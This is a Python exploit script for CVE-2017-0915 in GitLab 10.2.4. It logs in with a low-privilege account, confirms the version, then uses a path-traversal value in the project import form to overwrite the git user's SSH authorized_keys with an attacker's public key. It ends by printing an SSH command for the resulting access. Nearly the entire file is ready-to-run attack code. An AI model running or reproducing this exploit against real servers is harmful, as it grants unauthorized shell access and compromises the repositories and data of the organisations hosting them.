#!/usr/bin/env python3

import re
import requests
import requests.adapters
import urllib3

class GitlabExploit:
    """Allows program to exploit CVE-2017-0915 (overwrite SSH key for git user
    on a GitLab instance). The targeted GitLab must be installed in v10.2.4.
    Based on this exploit :
        https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41210
    """

    def __init__(self, target_host, https=True):
        """Constructor. User must submit target host.
        """
        self.sess = requests.Session()
        self.sess.mount('http://', requests.adapters.HTTPAdapter(max_retries=2))
        self.sess.mount('https://', requests.adapters.HTTPAdapter(max_retries=2))
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        self.authenticated = False

        self.target_host = target_host
        scheme = 'https://' if https else 'http://'
        self.baseurl = scheme + target_host

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
        }

    """
    ========================================================================
        Functions
    ========================================================================
    """

    def login(self, username, password):
        """Logs in the GitLab interface with the provided credentials.
        (The attacker must have an account)
        Returns True if the authentication is successful, or False.
        """
        if not self.authenticated:
            # Pre loading of the login form (to get the CSRF token)
            r = self.sess.request('GET', f'{self.baseurl}/users/sign_in', headers=self.headers, verify=False)
            token = re.findall(r'authenticity_token" value="([^"]+)"', r.text)
            if not token:
                return False
            token = token[1]

            # Authenticating the user
            r2 = self.sess.request(
                'POST',
                f'{self.baseurl}/users/sign_in',
                data={
                    'utf8': '✓',
                    'authenticity_token': token,
                    'user[login]': username,
                    'user[password]': password,
                    'user[remember_me]': '0'
                },
                headers=self.headers,
                allow_redirects=True,
                verify=False
            )

            if r2.url == f'{self.baseurl}/' and re.search(f'data-user="{username}"', r2.text):
                self.authenticated = True

        return self.authenticated

    def check_target(self):
        """Checks if the GitLab is vulnerable to this CVE (version must be
        10.2.4). Returns True if the GitLab has the right version, or False.
        """
        if self.authenticated:
            r = self.sess.request('GET', f'{self.baseurl}/help', headers=self.headers, verify=False)
            if re.search("<span>10.2.4</span>", r.text):
                return True

        return False

    def pwn(self, pubkey):
        """Uploads the SSH pubkey to the remote GitLab by exploiting the CVE
        and overwriting /var/opt/gitlab/.ssh/authorized_keys.
        To check whether the exploit is successful, you have to try to connect
        via SSH after having called pwn().
        """
        if self.authenticated:
            # Get namespace id
            r = self.sess.request('GET', f'{self.baseurl}/dashboard/projects', headers=self.headers, verify=False)
            namespaceid = re.findall(r';gon.current_user_id=([0-9]+);gon.current_username', r.text)[0]

            # Get the CSRF token
            r2 = self.sess.request('GET', f'{self.baseurl}/import/gitlab_project/new?namespace_id={namespaceid}&path=', headers=self.headers, verify=False)
            token = re.findall(r'authenticity_token" value="([^"]+)"', r2.text)[0]

            # Pwning GitLab
            r3 = self.sess.request(
                'POST',
                f'{self.baseurl}/import/gitlab_project',
                data={
                    'utf8': '✓',
                    'authenticity_token': token,
                    'namespace_id': namespaceid,
                    'path': 'testproject/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys'
                },
                files={
                    'file': (
                        'testproject-master-9a7d3eb2f58316e4c7317594f8fbebfb8813b5e9.tar.gz',
                        bytes(pubkey, "utf8"),
                        'text/plain'
                    )
                },
                headers=self.headers,
                allow_redirects=False,
                verify=False
            )

            print('Pwned.')
            print(f'Now try to connect via SSH : ssh -i your_id_file git@{self.target_host}')
